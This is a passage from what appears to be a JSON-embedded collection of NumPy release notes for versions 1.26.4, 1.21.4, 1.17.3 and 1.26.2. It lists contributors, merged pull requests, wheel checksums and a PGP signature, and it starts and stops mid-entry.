406aea6081c1affbebdb6ad56b5deaf4  numpy-1.26.4-cp39-cp39-macosx_11_0_arm64.whl\n    fee12f0a3cbac7bbf1a1c2d82d3b02a9  numpy-1.26.4-cp39-cp39-manylinux_2_17_aarch64.manylinux2014_aarch64.whl\n    baf4b7143c7b9ce170e62b33380fb573  numpy-1.26.4-cp39-cp39-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\n    376ff29f90b7840ae19ecd59ad1ddf53  numpy-1.26.4-cp39-cp39-musllinux_1_1_aarch64.whl\n    86785b3a7cd156c08c2ebc26f7816fb3  numpy-1.26.4-cp39-cp39-musllinux_1_1_x86_64.whl\n    ab8a9ab69f16b7005f238cda76bc0bac  numpy-1.26.4-cp39-cp39-win32.whl\n    fafa4453e820c7ff40907e5dc79d8199  numpy-1.26.4-cp39-cp39-win_amd64.whl\n    7f13e2f07bd3e4a439ade0e4d27905c6  numpy-1.26.4-pp39-pypy39_pp73-macosx_10_9_x86_64.whl\n    928954b41c1cd0e856f1a31d41722661  numpy-1.26.4-pp39-pypy39_pp73-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\n    57bbd5c0b3848d804c416cbcab4a0ae8  numpy-1.26.4-pp39-pypy39_pp73-win_amd64.whl\n    19550cbe7bedd96a928da9d4ad69509d  numpy-1.26.4.tar.gz\n\nSHA256\n------\n::\n\n    9ff0f4f29c51e2803569d7a51c2304de5554655a60c5d776e35b4a41413830d0  numpy-1.26.4-cp310-cp310-macosx_10_9_x86_64.whl\n    2e4ee3380d6de9c9ec04745830fd9e2eccb3e6cf790d39d7b98ffd19b0dd754a  numpy-1.26.4-cp310-cp310-macosx_11_0_arm64.whl\n    d209d8969599b27ad20994c8e41936ee0964e6da07478d6c35016bc386b66ad4  numpy-1.26.4-cp310-cp310-manylinux_2_17_aarch64.manylinux2014_aarch64.whl\n    ffa75af20b44f8dba823498024771d5ac50620e6915abac414251bd971b4529f  numpy-1.26.4-cp310-cp310-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\n    62b8e4b1e28009ef2846b4c7852046736bab361f7aeadeb6a5b89ebec3c7055a  numpy-1.26.4-cp310-cp310-musllinux_1_1_aarch64.whl\n    a4abb4f9001ad2858e7ac189089c42178fcce737e4169dc61321660f1a96c7d2  numpy-1.26.4-cp310-cp310-musllinux_1_1_x86_64.whl\n    bfe25acf8b437eb2a8b2d49d443800a5f18508cd811fea3181723922a8a82b07  numpy-1.26.4-cp310-cp310-win32.whl\n    b97fe8060236edf3662adfc2c633f56a08ae30560c56310562cb4f95500022d5  numpy-1.26.4-cp310-cp310-win_amd64.whl\n    4c66707fabe114439db9068ee468c26bbdf909cac0fb58686a42a24de1760c71  numpy-1.26.4-cp311-cp311-macosx_10_9_x86_64.whl\n    edd8b5fe47dab091176d21bb6de568acdd906d1887a4584a15a9a96a1dca06ef  numpy-1.26.4-cp311-cp311-macosx_11_0_arm64.whl\n    7ab55401287bfec946ced39700c053796e7cc0e3acbef09993a9ad2adba6ca6e  numpy-1.26.4-cp311-cp311-manylinux_2_17_aarch64.manylinux2014_aarch64.whl\n    666dbfb6ec68962c033a450943ded891bed2d54e6755e35e5835d63f4f6931d5  numpy-1.26.4-cp311-cp311-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\n    96ff0b2ad353d8f990b63294c8986f1ec3cb19d749234014f4e7eb0112ceba5a  numpy-1.26.4-cp311-cp311-musllinux_1_1_aarch64.whl\n    60dedbb91afcbfdc9bc0b1f3f402804070deed7392c23eb7a7f07fa857868e8a  numpy-1.26.4-cp311-cp311-musllinux_1_1_x86_64.whl\n    1af303d6b2210eb850fcf03064d364652b7120803a0b872f5211f5234b399f20  numpy-1.26.4-cp311-cp311-win32.whl\n    cd25bcecc4974d09257ffcd1f098ee778f7834c3ad767fe5db785be9a4aa9cb2  numpy-1.26.4-cp311-cp311-win_amd64.whl\n    b3ce300f3644fb06443ee2222c2201dd3a89ea6040541412b8fa189341847218  numpy-1.26.4-cp312-cp312-macosx_10_9_x86_64.whl\n    03a8c78d01d9781b28a6989f6fa1bb2c4f2d51201cf99d3dd875df6fbd96b23b  numpy-1.26.4-cp312-cp312-macosx_11_0_arm64.whl\n    9fad7dcb1aac3c7f0584a5a8133e3a43eeb2fe127f47e3632d43d677c66c102b  numpy-1.26.4-cp312-cp312-manylinux_2_17_aarch64.manylinux2014_aarch64.whl\n    675d61ffbfa78604709862923189bad94014bef562cc35cf61d3a07bba02a7ed  numpy-1.26.4-cp312-cp312-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\n    ab47dbe5cc8210f55aa58e4805fe224dac469cde56b9f731a4c098b91917159a  numpy-1.26.4-cp312-cp312-musllinux_1_1_aarch64.whl\n    1dda2e7b4ec9dd512f84935c5f126c8bd8b9f2fc001e9f54af255e8c5f16b0e0  numpy-1.26.4-cp312-cp312-musllinux_1_1_x86_64.whl\n    50193e430acfc1346175fcbdaa28ffec49947a06918b7b92130744e81e640110  numpy-1.26.4-cp312-cp312-win32.whl\n    08beddf13648eb95f8d867350f6a018a4be2e5ad54c8d8caed89ebca558b2818  numpy-1.26.4-cp312-cp312-win_amd64.whl\n    7349ab0fa0c429c82442a27a9673fc802ffdb7c7775fad780226cb234965e53c  numpy-1.26.4-cp39-cp39-macosx_10_9_x86_64.whl\n    52b8b60467cd7dd1e9ed082188b4e6bb35aa5cdd01777621a1658910745b90be  numpy-1.26.4-cp39-cp39-macosx_11_0_arm64.whl\n    d5241e0a80d808d70546c697135da2c613f30e28251ff8307eb72ba696945764  numpy-1.26.4-cp39-cp39-manylinux_2_17_aarch64.manylinux2014_aarch64.whl\n    f870204a840a60da0b12273ef34f7051e98c3b5961b61b0c2c1be6dfd64fbcd3  numpy-1.26.4-cp39-cp39-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\n    679b0076f67ecc0138fd2ede3a8fd196dddc2ad3254069bcb9faf9a79b1cebcd  numpy-1.26.4-cp39-cp39-musllinux_1_1_aarch64.whl\n    47711010ad8555514b434df65f7d7b076bb8261df1ca9bb78f53d3b2db02e95c  numpy-1.26.4-cp39-cp39-musllinux_1_1_x86_64.whl\n    a354325ee03388678242a4d7ebcd08b5c727033fcff3b2f536aea978e15ee9e6  numpy-1.26.4-cp39-cp39-win32.whl\n    3373d5d70a5fe74a2c1bb6d2cfd9609ecf686d47a2d7b1d37a8f3b6bf6003aea  numpy-1.26.4-cp39-cp39-win_amd64.whl\n    afedb719a9dcfc7eaf2287b839d8198e06dcd4cb5d276a3df279231138e83d30  numpy-1.26.4-pp39-pypy39_pp73-macosx_10_9_x86_64.whl\n    95a7476c59002f2f6c590b9b7b998306fba6a5aa646b1e22ddfeaf8f78c3a29c  numpy-1.26.4-pp39-pypy39_pp73-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\n    7e50d0a0cc3189f9cb0aeb3a6a6af18c16f59f004b866cd2be1c14b36134a4a0  numpy-1.26.4-pp39-pypy39_pp73-win_amd64.whl\n    2a02aba9ed12e4ac4eb3ea9421c420301a0c6460d9830d74a9df87efa4912010  numpy-1.26.4.tar.gz\n\n\n.. currentmodule:: numpy\n\n==========================\n", "1.21.4": "==========================\n\nThe NumPy 1.21.4 is a maintenance release that fixes a few bugs discovered\nafter 1.21.3. The most important fix here is a fix for the NumPy header files\nto make them work for both x86_64 and M1 hardware when included in the Mac\nuniversal2 wheels. Previously, the header files only worked for M1 and this\ncaused problems for folks building x86_64 extensions. This problem was not seen\nbefore Python 3.10 because there were thin wheels for x86_64 that had\nprecedence. This release also provides thin x86_64 Mac wheels for Python 3.10.\n\nThe Python versions supported in this release are 3.7-3.10. If you want to\ncompile your own version using gcc-11, you will need to use gcc-11.2+ to avoid\nproblems.\n\nContributors\n============\n\nA total of 7 people contributed to this release.  People with a \"+\" by their\nnames contributed a patch for the first time.\n\n* Bas van Beek\n* Charles Harris\n* Isuru Fernando\n* Matthew Brett\n* Sayed Adel\n* Sebastian Berg\n* \u5085\u7acb\u4e1a\uff08Chris Fu\uff09 +\n\nPull requests merged\n====================\n\nA total of 9 pull requests were merged for this release.\n\n* `20278 <https://github.com/numpy/numpy/pull/20278>`__: BUG: Fix shadowed reference of `dtype` in type stub\n* `20293 <https://github.com/numpy/numpy/pull/20293>`__: BUG: Fix headers for universal2 builds\n* `20294 <https://github.com/numpy/numpy/pull/20294>`__: BUG: ``VOID_nonzero`` could sometimes mutate alignment flag\n* `20295 <https://github.com/numpy/numpy/pull/20295>`__: BUG: Do not use nonzero fastpath on unaligned arrays\n* `20296 <https://github.com/numpy/numpy/pull/20296>`__: BUG: Distutils patch to allow for 2 as a minor version (!)\n* `20297 <https://github.com/numpy/numpy/pull/20297>`__: BUG, SIMD: Fix 64-bit/8-bit integer division by a scalar\n* `20298 <https://github.com/numpy/numpy/pull/20298>`__: BUG, SIMD: Workaround broadcasting SIMD 64-bit integers on MSVC...\n* `20300 <https://github.com/numpy/numpy/pull/20300>`__: REL: Prepare for the NumPy 1.21.4 release.\n* `20302 <https://github.com/numpy/numpy/pull/20302>`__: TST: Fix a `Arrayterator` typing test failure\n\nChecksums\n=========\n\nMD5\n---\n::\n\n    95486a3ed027c926fb3fc279db6d843e  numpy-1.21.4-cp310-cp310-macosx_10_9_universal2.whl\n    9f57fad74762f7665669af33583a3dc9  numpy-1.21.4-cp310-cp310-macosx_10_9_x86_64.whl\n    719a9053aef01a067ce44ede2281eef9  numpy-1.21.4-cp310-cp310-macosx_11_0_arm64.whl\n    72035d101774fd03beff391927f59aa9  numpy-1.21.4-cp310-cp310-manylinux_2_17_aarch64.manylinux2014_aarch64.whl\n    5813e7a378a6e3f5c269c23f61eff4d9  numpy-1.21.4-cp310-cp310-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\n    b88a1bc4f08dfb154d5a07d15e387af6  numpy-1.21.4-cp310-cp310-win_amd64.whl\n    f0cc946d2f4ab4df7cc7e0cc8cfd429e  numpy-1.21.4-cp37-cp37m-macosx_10_9_x86_64.whl\n    1234643306ce481f0e5f801ddf3f1099  numpy-1.21.4-cp37-cp37m-manylinux_2_12_i686.manylinux2010_i686.whl\n    b9208ce1695ba61ab2932c7ce7285d1d  numpy-1.21.4-cp37-cp37m-manylinux_2_12_x86_64.manylinux2010_x86_64.whl\n    9804fe2011618bf2d7b8d92f6860b2e3  numpy-1.21.4-cp37-cp37m-manylinux_2_17_aarch64.manylinux2014_aarch64.whl\n    2ad3a06f974acd61326fd66c098df5bc  numpy-1.21.4-cp37-cp37m-win32.whl\n    172301389f1532b2d9130362580e1e22  numpy-1.21.4-cp37-cp37m-win_amd64.whl\n    a037bf88979ae0d4699a0cdce92bbab3  numpy-1.21.4-cp38-cp38-macosx_10_9_universal2.whl\n    ba94609688f575cc8dce84f1512db116  numpy-1.21.4-cp38-cp38-macosx_10_9_x86_64.whl\n    c78edc0ae8c9a5d8d0f9e3eb6dabd0b3  numpy-1.21.4-cp38-cp38-macosx_11_0_arm64.whl\n    d683b6f6af46806391579d528a040451  numpy-1.21.4-cp38-cp38-manylinux_2_12_i686.manylinux2010_i686.whl\n    df631f776716aeb3fd705f3659599b9e  numpy-1.21.4-cp38-cp38-manylinux_2_12_x86_64.manylinux2010_x86_64.whl\n    b1cbca49d24c7ba43d377feb425afdce  numpy-1.21.4-cp38-cp38-manylinux_2_17_aarch64.manylinux2014_aarch64.whl\n    8b5c214bc0f060dbb0287c15dde4673d  numpy-1.21.4-cp38-cp38-win32.whl\n    2307cf9f3c02f6cdad448a681c272974  numpy-1.21.4-cp38-cp38-win_amd64.whl\n    fc02b5a068e29b2dd2de19c7ddd69926  numpy-1.21.4-cp39-cp39-macosx_10_9_universal2.whl\n    f16068540001de8a3d8f096830c97ea2  numpy-1.21.4-cp39-cp39-macosx_10_9_x86_64.whl\n    80562c39cfbdf1af9bb43b2ea5e45b6d  numpy-1.21.4-cp39-cp39-macosx_11_0_arm64.whl\n    6c103bec3085e5a6ea92cf7f6e4189ab  numpy-1.21.4-cp39-cp39-manylinux_2_12_i686.manylinux2010_i686.whl\n    9d715ba5f7596a39eb631f2dae85d203  numpy-1.21.4-cp39-cp39-manylinux_2_12_x86_64.manylinux2010_x86_64.whl\n    8b8cf8c7b093419ff75ed1dd2eaa18ae  numpy-1.21.4-cp39-cp39-manylinux_2_17_aarch64.manylinux2014_aarch64.whl\n    404200b858b7addd03f6cdd5a484d30a  numpy-1.21.4-cp39-cp39-win32.whl\n    cdab6a1bf1b86021526d08a60219a6ad  numpy-1.21.4-cp39-cp39-win_amd64.whl\n    70ca6b591e844fdcb8c22175f094d3b4  numpy-1.21.4-pp37-pypy37_pp73-manylinux_2_12_x86_64.manylinux2010_x86_64.whl\n    06019c1116b3e2791bd507f898257e7f  numpy-1.21.4.tar.gz\n    b3c4477a027d5b6fba5e1065064fd076  numpy-1.21.4.zip\n\nSHA256\n------\n::\n\n    8890b3360f345e8360133bc078d2dacc2843b6ee6059b568781b15b97acbe39f  numpy-1.21.4-cp310-cp310-macosx_10_9_universal2.whl\n    69077388c5a4b997442b843dbdc3a85b420fb693ec8e33020bb24d647c164fa5  numpy-1.21.4-cp310-cp310-macosx_10_9_x86_64.whl\n    e89717274b41ebd568cd7943fc9418eeb49b1785b66031bc8a7f6300463c5898  numpy-1.21.4-cp310-cp310-macosx_11_0_arm64.whl\n    0b78ecfa070460104934e2caf51694ccd00f37d5e5dbe76f021b1b0b0d221823  numpy-1.21.4-cp310-cp310-manylinux_2_17_aarch64.manylinux2014_aarch64.whl\n    615d4e328af7204c13ae3d4df7615a13ff60a49cb0d9106fde07f541207883ca  numpy-1.21.4-cp310-cp310-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\n    1403b4e2181fc72664737d848b60e65150f272fe5a1c1cbc16145ed43884065a  numpy-1.21.4-cp310-cp310-win_amd64.whl\n    74b85a17528ca60cf98381a5e779fc0264b4a88b46025e6bcbe9621f46bb3e63  numpy-1.21.4-cp37-cp37m-macosx_10_9_x86_64.whl\n    92aafa03da8658609f59f18722b88f0a73a249101169e28415b4fa148caf7e41  numpy-1.21.4-cp37-cp37m-manylinux_2_12_i686.manylinux2010_i686.whl\n    5d95668e727c75b3f5088ec7700e260f90ec83f488e4c0aaccb941148b2cd377  numpy-1.21.4-cp37-cp37m-manylinux_2_12_x86_64.manylinux2010_x86_64.whl\n    f5162ec777ba7138906c9c274353ece5603646c6965570d82905546579573f73  numpy-1.21.4-cp37-cp37m-manylinux_2_17_aarch64.manylinux2014_aarch64.whl\n    81225e58ef5fce7f1d80399575576fc5febec79a8a2742e8ef86d7b03beef49f  numpy-1.21.4-cp37-cp37m-win32.whl\n    32fe5b12061f6446adcbb32cf4060a14741f9c21e15aaee59a207b6ce6423469  numpy-1.21.4-cp37-cp37m-win_amd64.whl\n    c449eb870616a7b62e097982c622d2577b3dbc800aaf8689254ec6e0197cbf1e  numpy-1.21.4-cp38-cp38-macosx_10_9_universal2.whl\n    2e4ed57f45f0aa38beca2a03b6532e70e548faf2debbeb3291cfc9b315d9be8f  numpy-1.21.4-cp38-cp38-macosx_10_9_x86_64.whl\n    1247ef28387b7bb7f21caf2dbe4767f4f4175df44d30604d42ad9bd701ebb31f  numpy-1.21.4-cp38-cp38-macosx_11_0_arm64.whl\n    34f3456f530ae8b44231c63082c8899fe9c983fd9b108c997c4b1c8c2d435333  numpy-1.21.4-cp38-cp38-manylinux_2_12_i686.manylinux2010_i686.whl\n    4c9c23158b87ed0e70d9a50c67e5c0b3f75bcf2581a8e34668d4e9d7474d76c6  numpy-1.21.4-cp38-cp38-manylinux_2_12_x86_64.manylinux2010_x86_64.whl\n    e4799be6a2d7d3c33699a6f77201836ac975b2e1b98c2a07f66a38f499cb50ce  numpy-1.21.4-cp38-cp38-manylinux_2_17_aarch64.manylinux2014_aarch64.whl\n    bc988afcea53e6156546e5b2885b7efab089570783d9d82caf1cfd323b0bb3dd  numpy-1.21.4-cp38-cp38-win32.whl\n    170b2a0805c6891ca78c1d96ee72e4c3ed1ae0a992c75444b6ab20ff038ba2cd  numpy-1.21.4-cp38-cp38-win_amd64.whl\n    fde96af889262e85aa033f8ee1d3241e32bf36228318a61f1ace579df4e8170d  numpy-1.21.4-cp39-cp39-macosx_10_9_universal2.whl\n    c885bfc07f77e8fee3dc879152ba993732601f1f11de248d4f357f0ffea6a6d4  numpy-1.21.4-cp39-cp39-macosx_10_9_x86_64.whl\n    9e6f5f50d1eff2f2f752b3089a118aee1ea0da63d56c44f3865681009b0af162  numpy-1.21.4-cp39-cp39-macosx_11_0_arm64.whl\n    ad010846cdffe7ec27e3f933397f8a8d6c801a48634f419e3d075db27acf5880  numpy-1.21.4-cp39-cp39-manylinux_2_12_i686.manylinux2010_i686.whl\n    c74c699b122918a6c4611285cc2cad4a3aafdb135c22a16ec483340ef97d573c  numpy-1.21.4-cp39-cp39-manylinux_2_12_x86_64.manylinux2010_x86_64.whl\n    9864424631775b0c052f3bd98bc2712d131b3e2cd95d1c0c68b91709170890b0  numpy-1.21.4-cp39-cp39-manylinux_2_17_aarch64.manylinux2014_aarch64.whl\n    b1e2312f5b8843a3e4e8224b2b48fe16119617b8fc0a54df8f50098721b5bed2  numpy-1.21.4-cp39-cp39-win32.whl\n    e3c3e990274444031482a31280bf48674441e0a5b55ddb168f3a6db3e0c38ec8  numpy-1.21.4-cp39-cp39-win_amd64.whl\n    a3deb31bc84f2b42584b8c4001c85d1934dbfb4030827110bc36bfd11509b7bf  numpy-1.21.4-pp37-pypy37_pp73-manylinux_2_12_x86_64.manylinux2010_x86_64.whl\n    5d412381aa489b8be82ac5c6a9e99c3eb3f754245ad3f90ab5c339d92f25fb47  numpy-1.21.4.tar.gz\n    e6c76a87633aa3fa16614b61ccedfae45b91df2767cf097aa9c933932a7ed1e0  numpy-1.21.4.zip\n\n\n-----BEGIN PGP SIGNED MESSAGE-----\nHash: SHA256\n\n.. currentmodule:: numpy\n\n==========================\n", "1.17.3": "==========================\n\nThis release contains fixes for bugs reported against NumPy 1.17.2 along with a\nsome documentation improvements. The Python versions supported in this release \nare 3.5-3.8.\n\nDownstream developers should use Cython >= 0.29.13 for Python 3.8 support and\nOpenBLAS >= 3.7 to avoid errors on the Skylake architecture.\n\n\nHighlights\n==========\n\n- - Wheels for Python 3.8\n- - Boolean ``matmul`` fixed to use booleans instead of integers.\n\n\nCompatibility notes\n===================\n\n- - The seldom used ``PyArray_DescrCheck`` macro has been changed/fixed.\n\n\nContributors\n============\n\nA total of 7 people contributed to this release.  People with a \"+\" by their\nnames contributed a patch for the first time.\n\n* Allan Haldane\n* Charles Harris\n* Kevin Sheppard\n* Matti Picus\n* Ralf Gommers\n* Sebastian Berg\n* Warren Weckesser\n\n\nPull requests merged\n====================\n\nA total of 12 pull requests were merged for this release.\n\n* `14456 <https://github.com/numpy/numpy/pull/14456>`__: MAINT: clean up pocketfft modules inside numpy.fft namespace.\n* `14463 <https://github.com/numpy/numpy/pull/14463>`__: BUG: random.hypergeometic assumes npy_long is npy_int64, hung...\n* `14502 <https://github.com/numpy/numpy/pull/14502>`__: BUG: random: Revert gh-14458 and refix gh-14557.\n* `14504 <https://github.com/numpy/numpy/pull/14504>`__: BUG: add a specialized loop for boolean matmul.\n* `14506 <https://github.com/numpy/numpy/pull/14506>`__: MAINT: Update pytest version for Python 3.8\n* `14512 <https://github.com/numpy/numpy/pull/14512>`__: DOC: random: fix doc linking, was referencing private submodules.\n* `14513 <https://github.com/numpy/numpy/pull/14513>`__: BUG,MAINT: Some fixes and minor cleanup based on clang analysis\n* `14515 <https://github.com/numpy/numpy/pull/14515>`__: BUG: Fix randint when range is 2**32\n* `14519 <https://github.com/numpy/numpy/pull/14519>`__: MAINT: remove the entropy c-extension module\n* `14563 <https://github.com/numpy/numpy/pull/14563>`__: DOC: remove note about Pocketfft license file (non-existing here).\n* `14578 <https://github.com/numpy/numpy/pull/14578>`__: BUG: random: Create a legacy implementation of random.binomial.\n* `14687 <https://github.com/numpy/numpy/pull/14687>`__: BUG: properly define PyArray_DescrCheck\n\nChecksums\n=========\n\nMD5\n- ---\n\n    7e96dd5ca587fa647d21628072f08751  numpy-1.17.3-cp35-cp35m-macosx_10_6_intel.whl\n    f5fd3a434d9e426c9f01ca5669e84973  numpy-1.17.3-cp35-cp35m-manylinux1_i686.whl\n    d4520794f05e6466a1064e046b4ade2c  numpy-1.17.3-cp35-cp35m-manylinux1_x86_64.whl\n    67967e337b8378c92af9c2b6926b6dcd  numpy-1.17.3-cp35-cp35m-win32.whl\n    341b29b85c5305edd3f5ca9d9981f1b4  numpy-1.17.3-cp35-cp35m-win_amd64.whl\n    7d9492ee0fbe8292518af104772bcee0  numpy-1.17.3-cp36-cp36m-macosx_10_9_x86_64.whl\n    b0f1a9b0da552e2baa2e6db4668efee8  numpy-1.17.3-cp36-cp36m-manylinux1_i686.whl\n    8b9c50124ae13279e9969fc0cf3b5e5f  numpy-1.17.3-cp36-cp36m-manylinux1_x86_64.whl\n    428766619877efec34ba224d9252396c  numpy-1.17.3-cp36-cp36m-win32.whl\n    a2fd25bf087e7765a4322ef3fa7f87b6  numpy-1.17.3-cp36-cp36m-win_amd64.whl\n    98eb0ec4fe00f9f3309f2e523e76e36e  numpy-1.17.3-cp37-cp37m-macosx_10_9_x86_64.whl\n    415f086791be02d658a2800fa25874e4  numpy-1.17.3-cp37-cp37m-manylinux1_i686.whl\n    3f5fd3e63dc84db7dd3745b007faea46  numpy-1.17.3-cp37-cp37m-manylinux1_x86_64.whl\n    3f7ba813f7318d9671da66c610ab1e91  numpy-1.17.3-cp37-cp37m-win32.whl\n    deb55760769373ad1da9844df8b9c865  numpy-1.17.3-cp37-cp37m-win_amd64.whl\n    964b1cdad1cf20c63461246fe0638956  numpy-1.17.3-cp38-cp38-macosx_10_9_x86_64.whl\n    ece34643fc0c42801a8d3a53708f09ed  numpy-1.17.3-cp38-cp38-manylinux1_i686.whl\n    081fd68219088577857ebd265e963d1e  numpy-1.17.3-cp38-cp38-manylinux1_x86_64.whl\n    a231efeb2cfe69cf94764ccecba73d50  numpy-1.17.3-cp38-cp38-win32.whl\n    1c548f96188826e6999d3ba3fde99cf9  numpy-1.17.3-cp38-cp38-win_amd64.whl\n    48d6d97d6037eb8e171064a850b53aab  numpy-1.17.3.tar.gz\n    a3195ccbbd97b0366f0c46e36a62717a  numpy-1.17.3.zip\n\nSHA256\n- ------\n\n    4dd830a11e8724c9c9379feed1d1be43113f8bcce55f47ea7186d3946769ce26  numpy-1.17.3-cp35-cp35m-macosx_10_6_intel.whl\n    30c84e3a62cfcb9e3066f25226e131451312a044f1fe2040e69ce792cb7de418  numpy-1.17.3-cp35-cp35m-manylinux1_i686.whl\n    9395b0a41e8b7e9a284e3be7060db9d14ad80273841c952c83a5afc241d2bd98  numpy-1.17.3-cp35-cp35m-manylinux1_x86_64.whl\n    9e37c35fc4e9410093b04a77d11a34c64bf658565e30df7cbe882056088a91c1  numpy-1.17.3-cp35-cp35m-win32.whl\n    de2b1c20494bdf47f0160bd88ed05f5e48ae5dc336b8de7cfade71abcc95c0b9  numpy-1.17.3-cp35-cp35m-win_amd64.whl\n    669795516d62f38845c7033679c648903200980d68935baaa17ac5c7ae03ae0c  numpy-1.17.3-cp36-cp36m-macosx_10_9_x86_64.whl\n    4650d94bb9c947151737ee022b934b7d9a845a7c76e476f3e460f09a0c8c6f39  numpy-1.17.3-cp36-cp36m-manylinux1_i686.whl\n    4f2a2b279efde194877aff1f76cf61c68e840db242a5c7169f1ff0fd59a2b1e2  numpy-1.17.3-cp36-cp36m-manylinux1_x86_64.whl\n    ffca69e29079f7880c5392bf675eb8b4146479d976ae1924d01cd92b04cccbcc  numpy-1.17.3-cp36-cp36m-win32.whl\n    2e418f0a59473dac424f888dd57e85f77502a593b207809211c76e5396ae4f5c  numpy-1.17.3-cp36-cp36m-win_amd64.whl\n    75fcd60d682db3e1f8fbe2b8b0c6761937ad56d01c1dc73edf4ef2748d5b6bc4  numpy-1.17.3-cp37-cp37m-macosx_10_9_x86_64.whl\n    28b1180c758abf34a5c3fea76fcee66a87def1656724c42bb14a6f9717a5bdf7  numpy-1.17.3-cp37-cp37m-manylinux1_i686.whl\n    dd0667f5be56fb1b570154c2c0516a528e02d50da121bbbb2cbb0b6f87f59bc2  numpy-1.17.3-cp37-cp37m-manylinux1_x86_64.whl\n    25ffe71f96878e1da7e014467e19e7db90ae7d4e12affbc73101bcf61785214e  numpy-1.17.3-cp37-cp37m-win32.whl\n    0b0dd8f47fb177d00fa6ef2d58783c4f41ad3126b139c91dd2f7c4b3fdf5e9a5  numpy-1.17.3-cp37-cp37m-win_amd64.whl\n    62d22566b3e3428dfc9ec972014c38ed9a4db4f8969c78f5414012ccd80a149e  numpy-1.17.3-cp38-cp38-macosx_10_9_x86_64.whl\n    26efd7f7d755e6ca966a5c0ac5a930a87dbbaab1c51716ac26a38f42ecc9bc4b  numpy-1.17.3-cp38-cp38-manylinux1_i686.whl\n    b46554ad4dafb2927f88de5a1d207398c5385edbb5c84d30b3ef187c4a3894d8  numpy-1.17.3-cp38-cp38-manylinux1_x86_64.whl\n    c867eeccd934920a800f65c6068acdd6b87e80d45cd8c8beefff783b23cdc462  numpy-1.17.3-cp38-cp38-win32.whl\n    f1df7b2b7740dd777571c732f98adb5aad5450aee32772f1b39249c8a50386f6  numpy-1.17.3-cp38-cp38-win_amd64.whl\n    c93733dbebc2599d2747ceac4b18825a73767d289176ed8e02090325656d69aa  numpy-1.17.3.tar.gz\n    a0678793096205a4d784bd99f32803ba8100f639cf3b932dc63b21621390ea7e  numpy-1.17.3.zip\n-----BEGIN PGP SIGNATURE-----\n\niQEzBAEBCAAdFiEEU6DlKD8F4p1xKRSeZ58ig3fFJHsFAl2oepUACgkQZ58ig3fF\nJHsvWQgAhYB5EeEXVnrfB+TKHf3WUnxDfgOo0GdO4VcHls0TaOseM1heIOrCV/mZ\n3TSOpEqT68Lh50I53EHfS4r5iKTF7TY2DhACixvbKqJxA0ZCv7j+r7VZfW95ZAi7\nyxEvPo8bdXQDx1//F5ISRy36lT9ZJ8n2lxdMkcM18i2b+wqt71xhHNlK5emVAYSg\nkii57ek+RtgQeJL6l/sh6PqOdppGsa09cq0iQ97v23y0mrYltGC6BPtOVksIZIWe\nfTTLjJmeqf4oNDYRQb3nVxIQ8OLLCOd8JzD6PmQqd/BqUPaoaGTlyD/gooqZNrv+\nNsNVqkm28SqqEY8syZlsysH3LvoipA==\n=GyUB\n-----END PGP SIGNATURE-----\n\n\n.. currentmodule:: numpy\n\n==========================\n", "1.26.2": "==========================\n\nNumPy 1.26.2 is a maintenance release that fixes bugs and regressions\ndiscovered after the 1.26.1 release. The 1.26.release series is the last\nplanned minor release series before NumPy 2.0. The Python versions supported by\nthis release are 3.9-3.12.\n\n\nContributors\n============\n\nA total of 13 people contributed to this release.  People with a \"+\" by their\nnames contributed a patch for the first time.\n\n* stefan6419846\n* thalassemia +\n* Andrew Nelson\n* Charles Bousseau +\n* Charles Harris\n* Marcel Bargull +\n* Mark Mentovai +\n* Matti Picus\n* Nathan Goldbaum\n* Ralf Gommers\n* Sayed Adel\n* Sebastian Berg\n* William Ayd +\n\n\nPull requests merged\n====================\n\nA total of 25 pull requests were merged for this release.\n\n* `24814 <https://github.com/numpy/numpy/pull/24814>`__: MAINT: align test_dispatcher s390x targets with _umath_tests_mtargets\n* `24929 <https://github.com/numpy/numpy/pull/24929>`__: MAINT: prepare 1.26.x for further development\n* `24955 <https://github.com/numpy/numpy/pull/24955>`__: ENH: Add Cython enumeration for NPY_FR_GENERIC\n* `24962 <https://github.com/numpy/numpy/pull/24962>`__: REL: Remove Python upper version from the release branch\n* `24971 <https://github.com/numpy/numpy/pull/24971>`__: BLD: Use the correct Python interpreter when running tempita.py\n* `24972 <https://github.com/numpy/numpy/pull/24972>`__: MAINT: Remove unhelpful error replacements from ``import_array()``\n* `24977 <https://github.com/numpy/numpy/pull/24977>`__: BLD: use classic linker on macOS, the new one in XCode 15 has...\n* `25003 <https://github.com/numpy/numpy/pull/25003>`__: BLD: musllinux_aarch64 [wheel build]\n* `25043 <https://github.com/numpy/numpy/pull/25043>`__: MAINT: Update mailmap\n* `25049 <https://github.com/numpy/numpy/pull/25049>`__: MAINT: Update meson build infrastructure.\n* `25071 <https://github.com/numpy/numpy/pull/25071>`__: MAINT: Split up .github/workflows to match main\n* `25083 <https://github.com/numpy/numpy/pull/25083>`__: BUG: Backport fix build on ppc64 when the baseline set to Power9...\n* `25093 <https://github.com/numpy/numpy/pull/25093>`__: BLD: Fix features.h detection for Meson builds [1.26.x Backport]\n* `25095 <https://github.com/numpy/numpy/pull/25095>`__: BUG: Avoid intp conversion regression in Cython 3 (backport)\n* `25107 <https://github.com/numpy/numpy/pull/25107>`__: CI: remove obsolete jobs, and move macOS and conda Azure jobs...\n* `25108 <https://github.com/numpy/numpy/pull/25108>`__: CI: Add linux_qemu action and remove travis testing.\n* `25112 <https://github.com/numpy/numpy/pull/25112>`__: MAINT: Update .spin/cmds.py from main.\n* `25113 <https://github.com/numpy/numpy/pull/25113>`__: DOC: Visually divide main license and bundled licenses in wheels\n* `25115 <https://github.com/numpy/numpy/pull/25115>`__: MAINT: Add missing ``noexcept`` to shuffle helpers\n* `25116 <https://github.com/numpy/numpy/pull/25116>`__: DOC: Fix license identifier for OpenBLAS\n* `25117 <https://github.com/numpy/numpy/pull/25117>`__: BLD: improve detection of Netlib libblas/libcblas/liblapack\n* `25118 <https://github.com/numpy/numpy/pull/25118>`__: MAINT: Make bitfield integers unsigned\n* `25119 <https://github.com/numpy/numpy/pull/25119>`__: BUG: Make n a long int for np.random.multinomial\n* `25120 <https://github.com/numpy/numpy/pull/25120>`__: BLD: change default of the ``allow-noblas`` option to 